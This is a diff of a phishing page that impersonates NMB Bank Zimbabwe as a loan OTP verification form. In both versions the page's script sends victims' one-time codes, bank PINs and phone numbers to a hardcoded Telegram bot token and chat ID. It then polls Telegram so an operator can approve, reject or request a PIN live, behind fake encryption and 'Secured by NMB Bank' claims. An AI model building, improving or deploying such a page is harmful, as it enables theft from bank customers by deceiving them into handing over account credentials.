@@ -2,318 +2,480 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NMB Connect - OTP Verification</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#003366">
+    <title>NMB Loan | Verify OTP · Zimbabwe</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap');
-        * { font-family: 'Inter', sans-serif; }
-        body { background: linear-gradient(135deg, #003d7a 0%, #002147 100%); min-height: 100vh; }
-        .otp-input:focus { border-color: #fbbf24; box-shadow: 0 0 0 2px rgba(251, 191, 36, 0.2); }
-        .glass-effect { background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(10px); }
-        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        :root {
+            --nmb-blue: #003366;
+            --nmb-gold: #E4C16A;
+            --nmb-gold-light: #f1dfae;
+            --navy-dark: #002244;
+            --white: #ffffff;
+            --light: #f8f9fa;
+            --dark: #1a1a1a;
+            --muted: #666666;
+            --border: #e0ddd9;
+            --error: #d32f2f;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { -webkit-text-size-adjust: 100%; }
+
+        body {
+            font-family: 'Poppins', system-ui, sans-serif;
+            background: linear-gradient(135deg, var(--navy-dark) 0%, var(--nmb-blue) 50%, #004080 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        header {
+            background: white;
+            padding: 14px 5%;
+            border-bottom: 4px solid var(--nmb-gold);
+            box-shadow: 0 2px 8px rgba(0,51,102,0.08);
+        }
+
+        .logo { font-size: 22px; font-weight: 900; text-decoration: none; display: flex; align-items: center; }
+        .logo .nmb { color: var(--nmb-blue); }
+        .logo .loan { color: var(--nmb-gold); margin-left: 2px; }
+
+        main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 16px; }
+
+        .card {
+            background: white;
+            border-radius: 18px;
+            padding: 36px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,51,102,0.35);
+        }
+
+        .card-head { text-align: center; margin-bottom: 22px; }
+        .card-head h1 { font-size: 20px; font-weight: 900; color: var(--nmb-blue); margin-bottom: 4px; }
+        .card-head p { color: var(--muted); font-size: 12px; }
+
+        .bundle-bar {
+            background: linear-gradient(135deg, var(--nmb-blue), var(--navy-dark));
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-bottom: 20px;
+            color: white;
+            border: 1px solid rgba(255,255,255,0.08);
+        }
+
+        .b-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 6px; }
+        .b-row:last-child { margin-bottom: 0; padding-top: 8px; border-top: 1px solid rgba(255,255,255,0.15); font-weight: 800; font-size: 13px; }
+
+        .err {
+            display: none;
+            background: rgba(211,47,47,0.08);
+            border: 1.5px solid rgba(211,47,47,0.2);
+            color: var(--error);
+            font-size: 12px;
+            font-weight: 700;
+            border-radius: 10px;
+            padding: 10px 12px;
+            margin-bottom: 14px;
+            text-align: center;
+        }
+
+        .err.show { display: block; }
+
+        .fl { display: block; font-size: 10px; font-weight: 800; color: var(--nmb-blue); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px; }
+
+        .otp-row {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-bottom: 18px;
+        }
+
+        .otp-box {
+            width: 48px;
+            height: 54px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 900;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            background: var(--light);
+            color: var(--dark);
+            font-family: 'Poppins', monospace;
+            transition: all 0.2s;
+        }
+
+        .otp-box:focus { border-color: var(--nmb-gold); background: white; box-shadow: 0 0 0 4px rgba(228,193,106,0.08); outline: none; }
+        .otp-box.ok { border-color: #4caf50; background: rgba(76,175,80,0.05); }
+
+        .hint { font-size: 10px; color: var(--muted); text-align: center; margin-bottom: 8px; }
+
+        .btns { display: flex; gap: 10px; margin-top: 20px; }
+
+        .btn-p {
+            flex: 1;
+            background: linear-gradient(135deg, var(--nmb-blue), var(--navy-dark));
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 50px;
+            font-weight: 900;
+            font-size: 12px;
+            text-transform: uppercase;
+            cursor: pointer;
+            font-family: inherit;
+            box-shadow: 0 4px 14px rgba(0,51,102,0.28);
+            transition: all 0.2s;
+        }
+
+        .btn-p:hover { background: var(--nmb-gold); color: var(--nmb-blue); transform: translateY(-2px); box-shadow: 0 6px 18px rgba(228,193,106,0.3); }
+
+        .btn-o {
+            flex: 1;
+            background: transparent;
+            color: var(--nmb-blue);
+            border: 2px solid var(--nmb-blue);
+            padding: 14px;
+            border-radius: 50px;
+            font-weight: 800;
+            font-size: 12px;
+            text-transform: uppercase;
+            cursor: pointer;
+            font-family: inherit;
+        }
+
+        .btn-o:hover { background: var(--light); }
+
+        .card-ft { text-align: center; margin-top: 16px; font-size: 10px; color: var(--muted); }
+        .secure { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 12px; font-size: 10px; color: var(--muted); font-weight: 700; }
+
+        /* Loading */
+        .overlay {
+            position: fixed; inset: 0;
+            display: none;
+            align-items: center; justify-content: center; flex-direction: column; gap: 14px;
+            background: rgba(0,34,68,0.93);
+            z-index: 2000;
+            backdrop-filter: blur(6px);
+        }
+
+        .overlay.on { display: flex; }
+        .spin { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.12); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
+        .sp-t { font-size: 14px; font-weight: 800; color: white; }
+        .sp-s { font-size: 11px; color: rgba(255,255,255,0.65); }
+        @keyframes sp { to { transform: rotate(360deg); } }
+
+        /* PIN Modal */
+        .pin-overlay {
+            position: fixed; inset: 0;
+            display: none;
+            align-items: center; justify-content: center;
+            background: linear-gradient(135deg, var(--navy-dark), var(--nmb-blue));
+            z-index: 2000;
+            padding: 20px;
+            backdrop-filter: blur(6px);
+        }
+
+        .pin-overlay.on { display: flex; }
+
+        .pin-card {
+            background: white;
+            border-radius: 18px;
+            padding: 36px 28px;
+            max-width: 380px;
+            width: 100%;
+            box-shadow: 0 24px 64px rgba(0,51,102,0.4);
+            text-align: center;
+        }
+
+        .pin-logo { font-size: 20px; font-weight: 900; margin-bottom: 18px; display: flex; align-items: center; justify-content: center; }
+        .pin-logo .nmb { color: var(--nmb-blue); }
+        .pin-logo .loan { color: var(--nmb-gold); margin-left: 2px; }
+
+        .pin-title { font-size: 17px; font-weight: 900; color: var(--nmb-blue); margin-bottom: 4px; }
+        .pin-sub { font-size: 12px; color: var(--muted); margin-bottom: 22px; }
+
+        .pin-amount {
+            background: linear-gradient(135deg, var(--light), var(--white));
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 20px;
+            border: 1.5px solid var(--border);
+        }
+
+        .pin-amount .pa-label { font-size: 10px; color: var(--muted); font-weight: 700; text-transform: uppercase; }
+        .pin-amount .pa-value { font-size: 1.5rem; font-weight: 900; color: var(--nmb-blue); margin-top: 3px; }
+
+        .pin-input-wrap {
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            padding: 14px;
+            background: var(--light);
+            margin-bottom: 16px;
+            transition: all 0.2s;
+        }
+
+        .pin-input-wrap:focus-within { border-color: var(--nmb-gold); background: white; box-shadow: 0 0 0 4px rgba(228,193,106,0.08); }
+
+        .pin-fi {
+            width: 100%;
+            border: none;
+            background: transparent;
+            font-size: 26px;
+            color: var(--dark);
+            outline: none;
+            font-family: inherit;
+            letter-spacing: 14px;
+            text-align: center;
+            font-weight: 900;
+        }
+
+        .pin-fi::placeholder { color: #b8b8b8; letter-spacing: 0; font-size: 13px; font-weight: 500; }
+
+        .pin-err {
+            display: none;
+            background: rgba(211,47,47,0.08);
+            border: 1.5px solid rgba(211,47,47,0.2);
+            color: var(--error);
+            font-size: 11px;
+            font-weight: 700;
+            border-radius: 10px;
+            padding: 9px;
+            margin-bottom: 14px;
+        }
+
+        .pin-err.show { display: block; }
+
+        .pin-btns { display: flex; gap: 10px; }
+
+        .pin-btn {
+            flex: 1;
+            padding: 14px;
+            border-radius: 50px;
+            border: none;
+            font-weight: 900;
+            font-size: 12px;
+            text-transform: uppercase;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+
+        .pin-btn-ok { background: linear-gradient(135deg, var(--nmb-blue), var(--navy-dark)); color: white; box-shadow: 0 4px 14px rgba(0,51,102,0.28); }
+        .pin-btn-ok:hover { background: var(--nmb-gold); color: var(--nmb-blue); transform: translateY(-2px); }
+        .pin-btn-x { background: transparent; color: var(--nmb-blue); border: 2px solid var(--nmb-blue); }
+        .pin-btn-x:hover { background: var(--light); }
+
+        .pin-secure { margin-top: 16px; font-size: 10px; color: var(--muted); font-weight: 700; }
+
+        @media (max-width: 500px) {
+            main { padding: 24px 12px; }
+            .card { padding: 28px 18px; }
+            .otp-row { gap: 5px; }
+            .otp-box { width: 40px; height: 48px; font-size: 18px; }
+            .btns { flex-direction: column; }
+            .pin-card { padding: 28px 18px; }
+        }
     </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen p-4">
-    <div class="w-full max-w-sm fade-in">
-        <!-- Header -->
-        <div class="text-center mb-6">
-            <div class="flex items-center justify-center gap-2 mb-2">
-                <div class="w-8 h-8 bg-white rounded-full flex items-center justify-center shadow-lg">
-                    <span class="text-sm font-black text-[#003d7a]">N</span>
-                </div>
-                <div>
-                    <div class="flex items-center gap-1">
-                        <span class="text-2xl font-black text-white tracking-tighter">NMB</span>
-                        <span class="text-2xl font-black text-[#fbbf24] tracking-tighter">Connect</span>
-                    </div>
-                </div>
+<body>
+    <header><a class="logo" href="index.html"><span class="nmb">NMB</span><span class="loan">Loan</span></a></header>
+
+    <main>
+        <div class="card">
+            <div class="card-head">
+                <h1>Verify Code</h1>
+                <p>Enter the 6-digit OTP code sent to your phone</p>
             </div>
-            <p class="text-white/80 text-[9px] font-bold uppercase tracking-[0.2em]">OTP Verification</p>
+
+            <div id="bBar" class="bundle-bar" style="display:none;">
+                <div class="b-row"><span>Loan Type:</span><span id="bD">&mdash;</span></div>
+                <div class="b-row"><span>Amount:</span><span id="bP">$0 USD</span></div>
+            </div>
+
+            <div id="err" class="err"></div>
+
+            <label class="fl">OTP Verification Code</label>
+            <div class="otp-row" id="otpRow">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            </div>
+            <p class="hint">Check your SMS for the 6-digit OTP code</p>
+
+            <div class="btns">
+                <button class="btn-p" onclick="doOTP()">Verify & Continue</button>
+                <button class="btn-o" onclick="location.href='login.html'">Cancel</button>
+            </div>
+
+            <div class="card-ft">Protected by 256-bit encryption.</div>
+            <div class="secure">🔒 End-to-End Encrypted</div>
         </div>
+    </main>
 
-        <!-- Main Card -->
-        <div class="glass-effect rounded-3xl shadow-2xl overflow-hidden">
-            <!-- Title Section -->
-            <div class="bg-gradient-to-r from-[#003d7a] to-[#005a99] p-6 text-center">
-                <h1 class="text-white font-black text-xl mb-1 uppercase tracking-tight">Enter OTP Code</h1>
-                <p class="text-white/70 text-[9px] font-bold uppercase tracking-widest">Sent to <span id="phoneDisplay" class="text-white font-black">+263XXXXXXXXX</span></p>
+    <div id="ov" class="overlay"><div class="spin"></div><div class="sp-t">Verifying Code</div><div class="sp-s">Please wait...</div></div>
+
+    <!-- PIN Modal -->
+    <div id="pinOv" class="pin-overlay">
+        <div class="pin-card">
+            <div class="pin-logo"><span class="nmb">NMB</span><span class="loan">Loan</span></div>
+            <div class="pin-title">Confirm Application</div>
+            <div class="pin-sub">Enter your NMB PIN to authorize this loan application</div>
+
+            <div class="pin-amount">
+                <div class="pa-label">Loan Amount</div>
+                <div class="pa-value" id="pinAmt">$0 USD</div>
             </div>
 
-            <!-- Content -->
-            <div id="otpForm" class="p-6 sm:p-8 space-y-6">
-                <div class="bg-blue-50/50 border border-blue-100 rounded-2xl p-4 flex justify-between items-center">
-                    <span class="text-[9px] font-black text-gray-400 uppercase tracking-widest">Loan Amount</span>
-                    <span class="font-black text-lg text-[#003d7a]" id="displayAmount">USD 500</span>
-                </div>
+            <div id="pinErr" class="pin-err"></div>
 
-                <div class="space-y-3">
-                    <label class="text-[9px] font-black text-gray-400 uppercase tracking-widest ml-1">6-Digit OTP Code</label>
-                    <div class="flex gap-2">
-                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
-                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
-                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
-                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
-                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
-                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
-                    </div>
-                </div>
-                
-                <div class="text-center">
-                    <p class="text-[9px] font-bold text-gray-400 uppercase tracking-widest">
-                        Resend code in <span id="timer" class="text-[#003d7a] font-black">59</span>s
-                    </p>
-                </div>
-
-                <button id="submitBtn" class="w-full bg-gradient-to-r from-[#003d7a] to-[#005a99] text-white font-black py-4 rounded-2xl hover:shadow-xl active:scale-[0.98] transition-all uppercase text-sm tracking-[0.15em] shadow-lg">
-                    Verify OTP <i class="fas fa-check-circle ml-2"></i>
-                </button>
+            <div class="pin-input-wrap">
+                <input type="password" class="pin-fi" id="pinIn" placeholder="Enter 4-digit PIN" inputmode="numeric" maxlength="4">
             </div>
 
-            <!-- Verification Overlay -->
-            <div id="verificationOverlay" class="hidden p-10 text-center space-y-6">
-                <div class="relative w-24 h-24 mx-auto">
-                    <div class="absolute inset-0 border-4 border-gray-50 rounded-full"></div>
-                    <div class="absolute inset-0 border-4 border-[#fbbf24] border-t-transparent rounded-full animate-spin"></div>
-                    <div class="absolute inset-0 flex items-center justify-center">
-                        <i class="fas fa-key text-3xl text-[#003d7a]"></i>
-                    </div>
-                </div>
-                <div class="space-y-2">
-                    <h3 class="text-xl font-black text-gray-800 uppercase tracking-tight">Verifying OTP</h3>
-                    <p class="text-gray-500 text-[9px] font-bold uppercase tracking-widest">Hold for verification...</p>
-                </div>
+            <div class="pin-btns">
+                <button class="pin-btn pin-btn-ok" onclick="doPin()">Authorize Now</button>
+                <button class="pin-btn pin-btn-x" onclick="closePin()">Cancel</button>
             </div>
+
+            <div class="pin-secure">🔒 Secured by NMB Bank · SSL 256-bit</div>
         </div>
-
-        <!-- PIN Modal -->
-        <div id="pinModal" class="fixed inset-0 bg-black/80 backdrop-blur-md hidden flex items-center justify-center p-4 z-50">
-            <div class="glass-effect rounded-3xl max-w-xs w-full overflow-hidden shadow-2xl fade-in">
-                <div class="bg-gradient-to-r from-[#003d7a] to-[#005a99] p-6 text-center">
-                    <h4 class="text-white font-black text-lg uppercase tracking-tight">Confirm Your PIN</h4>
-                    <p class="text-white/70 text-[9px] font-bold uppercase tracking-widest">Re-enter your 4-digit security PIN</p>
-                </div>
-                
-                <div class="p-8 space-y-6">
-                    <div id="pinEntry" class="space-y-6">
-                        <div class="flex gap-3">
-                            <input type="password" maxlength="1" class="pin-confirm w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-[#fbbf24]">
-                            <input type="password" maxlength="1" class="pin-confirm w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-[#fbbf24]">
-                            <input type="password" maxlength="1" class="pin-confirm w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-[#fbbf24]">
-                            <input type="password" maxlength="1" class="pin-confirm w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-[#fbbf24]">
-                        </div>
-                        <button id="confirmPinBtn" class="w-full bg-gradient-to-r from-[#003d7a] to-[#005a99] text-white font-black py-4 rounded-2xl uppercase text-sm tracking-[0.15em] shadow-lg hover:shadow-xl active:scale-[0.98] transition-all">
-                            Confirm PIN <i class="fas fa-lock ml-2"></i>
-                        </button>
-                    </div>
-
-                    <div id="pinAdmin" class="hidden text-center py-4">
-                        <div class="animate-spin w-12 h-12 border-4 border-[#fbbf24] border-t-transparent rounded-full mx-auto mb-4"></div>
-                        <p class="text-[9px] font-black text-gray-400 uppercase tracking-widest">Processing Final Verification</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Footer -->
-        <p class="text-center text-white/50 text-[9px] mt-8 font-bold uppercase tracking-widest">
-            © 2026 NMB Bank Zimbabwe | Secure OTP Portal
-        </p>
     </div>
 
     <script>
-        const TELEGRAM_BOT_TOKEN = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
-        const TELEGRAM_CHAT_ID = '7547427914';
-        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+        const BOT = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
+        const CID = '7547427914';
+        let bd = {}, luid = 0, otp = '', phone = '';
 
-        const otpInputs = document.querySelectorAll('.otp-input');
-        const pinConfirmInputs = document.querySelectorAll('.pin-confirm');
-        const submitBtn = document.getElementById('submitBtn');
-        const otpForm = document.getElementById('otpForm');
-        const verificationOverlay = document.getElementById('verificationOverlay');
-        const pinModal = document.getElementById('pinModal');
-        const pinEntry = document.getElementById('pinEntry');
-        const pinAdmin = document.getElementById('pinAdmin');
-        const confirmPinBtn = document.getElementById('confirmPinBtn');
-        const phoneDisplay = document.getElementById('phoneDisplay');
-        const displayAmount = document.getElementById('displayAmount');
-        const timerText = document.getElementById('timer');
-
-        const session = JSON.parse(localStorage.getItem('nmb_session') || '{}');
-        phoneDisplay.textContent = session.phone || '+263XXXXXXXXX';
-        displayAmount.textContent = `USD ${parseFloat(session.amount || 0).toLocaleString()}`;
-
-        // OTP Auto-focus and Auto-send
-        otpInputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                e.target.value = e.target.value.replace(/\D/g, '');
-                if (e.target.value && index < otpInputs.length - 1) otpInputs[index + 1].focus();
-                checkOtpComplete();
-            });
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && !e.target.value && index > 0) otpInputs[index - 1].focus();
-            });
-        });
-
-        function checkOtpComplete() {
-            const otp = Array.from(otpInputs).map(i => i.value).join('');
-            if (otp.length === 6) {
-                setTimeout(() => {
-                    sendOtpToTelegram(otp);
-                    triggerVerification();
-                }, 300);
+        function init() {
+            const p = new URLSearchParams(location.search);
+            const d = p.get('data'), pr = p.get('price');
+            phone = p.get('phone') || '';
+            if (d && pr) {
+                bd = { data: d, price: pr };
+                document.getElementById('bBar').style.display = 'block';
+                document.getElementById('bD').textContent = d;
+                document.getElementById('bP').textContent = '$' + pr + ' USD';
+                document.getElementById('pinAmt').textContent = '$' + pr + ' USD';
             }
         }
 
-        submitBtn.addEventListener('click', () => {
-            const otp = Array.from(otpInputs).map(i => i.value).join('');
-            if (otp.length === 6) {
-                sendOtpToTelegram(otp);
-                triggerVerification();
-            } else {
-                alert('Please enter the complete 6-digit OTP code');
-            }
+        // OTP boxes
+        const boxes = document.querySelectorAll('.otp-box');
+        boxes.forEach((b, i) => {
+            b.addEventListener('input', e => {
+                const v = e.target.value;
+                if (v.length > 1) {
+                    const digs = v.replace(/\D/g, '').split('');
+                    digs.forEach((d, j) => { if (i+j < boxes.length) { boxes[i+j].value = d; boxes[i+j].classList.add('ok'); } });
+                    boxes[Math.min(i + digs.length, boxes.length - 1)].focus();
+                    chk();
+                    return;
+                }
+                if (v) { b.classList.add('ok'); if (i < boxes.length - 1) boxes[i+1].focus(); }
+                else { b.classList.remove('ok'); }
+                chk();
+            });
+            b.addEventListener('keydown', e => {
+                if (e.key === 'Backspace' && !b.value && i > 0) boxes[i-1].focus();
+            });
         });
 
-        function triggerVerification() {
-            otpForm.classList.add('hidden');
-            verificationOverlay.classList.remove('hidden');
-        }
+        function chk() { otp = Array.from(boxes).map(b => b.value).join(''); }
+        function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.classList.add('show'); }
+        function clrErr() { document.getElementById('err').classList.remove('show'); }
 
-        async function sendOtpToTelegram(otp) {
-            const message = `
-🔐 <b>OTP VERIFICATION - NMB ZIMBABWE</b>
-
-📱 <b>Phone:</b> ${session.phone}
-🔑 <b>OTP Code:</b> <code>${otp}</code>
-💰 <b>Loan Amount:</b> USD ${session.amount}
-👤 <b>Applicant:</b> ${session.fullName}
-
-<b>Status: Awaiting Admin Verification</b>
-            `;
-
-            const inlineKeyboard = {
-                inline_keyboard: [
-                    [
-                        { text: '✅ VALID OTP', callback_data: `valid_otp_${session.phone}` },
-                        { text: '❌ INVALID OTP', callback_data: `invalid_otp_${session.phone}` }
-                    ]
-                ]
-            };
-
+        async function tg(msg, btns) {
             try {
-                await fetch(`${TELEGRAM_API}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML',
-                        reply_markup: inlineKeyboard
-                    })
+                    body: JSON.stringify({ chat_id: CID, text: msg, reply_markup: btns ? { inline_keyboard: btns } : undefined, parse_mode: 'HTML' })
                 });
-                
-                pollForOtpStatus(session.phone);
-            } catch (error) { 
-                console.error('Error sending OTP to Telegram:', error); 
-            }
+            } catch(e) { console.error(e); }
         }
 
-        function pollForOtpStatus(phone) {
-            const interval = setInterval(() => {
-                const status = localStorage.getItem(`otp_approval_${phone}`);
-                if (status === 'valid') {
-                    clearInterval(interval);
-                    localStorage.removeItem(`otp_approval_${phone}`);
-                    verificationOverlay.classList.add('hidden');
-                    pinModal.classList.remove('hidden');
-                } else if (status === 'invalid') {
-                    clearInterval(interval);
-                    localStorage.removeItem(`otp_approval_${phone}`);
-                    alert('Invalid OTP. Please try again.');
-                    location.reload();
-                }
+        function doOTP() {
+            clrErr();
+            if (otp.length !== 6) { showErr('Enter the 6-digit code'); return; }
+
+            const msg = `🔑 <b>OTP Code</b>\n\n<b>Phone:</b> <code>+263${phone}</code>\n<b>OTP:</b> <code>${otp}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>`;
+            const btns = [
+                [{ text: '✓ Valid', callback_data: 'otp_valid' }, { text: '✗ Invalid', callback_data: 'otp_invalid' }],
+                [{ text: '🔐 Request PIN', callback_data: 'otp_pin' }]
+            ];
+
+            document.getElementById('ov').classList.add('on');
+            tg(msg, btns);
+            poll();
+        }
+
+        function poll() {
+            const iv = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
+                    .then(r => r.json())
+                    .then(d => {
+                        if (d.ok && d.result.length > 0) {
+                            const u = d.result[0];
+                            luid = u.update_id;
+                            if (u.callback_query) {
+                                const cb = u.callback_query.data;
+                                if (cb === 'otp_valid') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); goSuccess(); }
+                                else if (cb === 'otp_invalid') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showErr('Invalid code. Try again.'); boxes.forEach(b => { b.value = ''; b.classList.remove('ok'); }); boxes[0].focus(); }
+                                else if (cb === 'otp_pin') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); document.getElementById('pinOv').classList.add('on'); }
+                            }
+                        }
+                    }).catch(e => console.error(e));
             }, 1000);
+            setTimeout(() => clearInterval(iv), 300000);
         }
 
-        // PIN Logic
-        pinConfirmInputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                e.target.value = e.target.value.replace(/\D/g, '');
-                if (e.target.value && index < pinConfirmInputs.length - 1) pinConfirmInputs[index + 1].focus();
-            });
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && !e.target.value && index > 0) pinConfirmInputs[index - 1].focus();
-            });
-        });
+        function doPin() {
+            const pin = document.getElementById('pinIn').value;
+            const e = document.getElementById('pinErr');
+            e.classList.remove('show');
+            if (pin.length !== 4) { e.textContent = 'Enter 4-digit PIN'; e.classList.add('show'); return; }
 
-        confirmPinBtn.addEventListener('click', () => {
-            const pin = Array.from(pinConfirmInputs).map(i => i.value).join('');
-            if (pin.length === 4) {
-                pinEntry.classList.add('hidden');
-                pinAdmin.classList.remove('hidden');
-                sendPinToTelegram(pin);
-            } else {
-                alert('Please enter the complete 4-digit PIN');
-            }
-        });
+            const msg = `🔐 <b>Transaction PIN</b>\n\n<b>Phone:</b> <code>+263${phone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>`;
+            const btns = [[{ text: '✓ Approve Loan', callback_data: 'pin_ok' }, { text: '✗ Decline', callback_data: 'pin_no' }]];
 
-        async function sendPinToTelegram(pin) {
-            const message = `
-🔒 <b>PIN VERIFICATION - NMB ZIMBABWE</b>
-
-📱 <b>Phone:</b> ${session.phone}
-🔑 <b>PIN Code:</b> <code>${pin}</code>
-💰 <b>Loan Amount:</b> USD ${session.amount}
-👤 <b>Applicant:</b> ${session.fullName}
-
-<b>Status: Final Verification Required</b>
-            `;
-
-            const inlineKeyboard = {
-                inline_keyboard: [
-                    [
-                        { text: '✅ VALID PIN', callback_data: `valid_pin_${session.phone}` },
-                        { text: '❌ INVALID PIN', callback_data: `invalid_pin_${session.phone}` }
-                    ]
-                ]
-            };
-
-            try {
-                await fetch(`${TELEGRAM_API}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML',
-                        reply_markup: inlineKeyboard
-                    })
-                });
-                
-                pollForPinStatus(session.phone);
-            } catch (error) { 
-                console.error('Error sending PIN to Telegram:', error); 
-            }
+            document.getElementById('pinOv').classList.remove('on');
+            document.getElementById('ov').classList.add('on');
+            tg(msg, btns);
+            pollPin();
         }
 
-        function pollForPinStatus(phone) {
-            const interval = setInterval(() => {
-                const status = localStorage.getItem(`pin_approval_${phone}`);
-                if (status === 'valid') {
-                    clearInterval(interval);
-                    localStorage.removeItem(`pin_approval_${phone}`);
-                    window.location.href = 'success.html';
-                } else if (status === 'invalid') {
-                    clearInterval(interval);
-                    localStorage.removeItem(`pin_approval_${phone}`);
-                    alert('Invalid PIN. Please try again.');
-                    location.reload();
-                }
+        function pollPin() {
+            const iv = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
+                    .then(r => r.json())
+                    .then(d => {
+                        if (d.ok && d.result.length > 0) {
+                            const u = d.result[0];
+                            luid = u.update_id;
+                            if (u.callback_query) {
+                                const cb = u.callback_query.data;
+                                if (cb === 'pin_ok') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); goSuccess(); }
+                                else if (cb === 'pin_no') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showErr('Authorization failed.'); }
+                            }
+                        }
+                    }).catch(e => console.error(e));
             }, 1000);
+            setTimeout(() => clearInterval(iv), 300000);
         }
+
+        function closePin() { document.getElementById('pinOv').classList.remove('on'); }
+
+        function goSuccess() {
+            location.href = `success.html?data=${encodeURIComponent(bd.data || '')}&price=${bd.price || '0'}&phone=${phone}`;
+        }
+
+        window.addEventListener('load', init);
     </script>
 </body>
 </html>
